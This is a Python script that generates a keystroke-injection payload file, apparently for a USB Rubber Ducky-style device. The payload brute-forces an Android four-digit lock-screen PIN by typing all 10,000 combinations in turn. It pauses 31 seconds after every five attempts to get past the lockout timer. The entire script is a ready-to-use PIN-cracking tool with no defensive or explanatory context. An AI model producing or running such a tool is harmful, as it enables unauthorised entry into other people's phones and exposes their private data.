from os import path
import desktop_file

desktop_path = desktop_file.getDesktopPath()
counter = 0
i = 0
delay_time = 500 #set delay time in milliseconds
delay_time_waiting = 31000 #set delay time in milliseconds

saved_file = desktop_path + "/4DigitsAndroidCracker_30sec.txt"
delay = "DELAY " + str(delay_time) + "\n"
delay_long = "DELAY " + str(delay_time_waiting) +"\n"
enter = "ENTER\n"

f = open(saved_file, "w")
while counter < 10000:
    digits = str(counter).zfill(4)
    f.write(enter)
    f.write(enter)
    if i == 5:
        f.write(delay_long)
        i = 0
    else:
        f.write(delay)
    f.write("STRING " + (str(digits)) + "\n")
    counter = counter +1
    i += 1
    print(counter)
f.write(enter)
f.write(enter)
print("done!")
f.close()
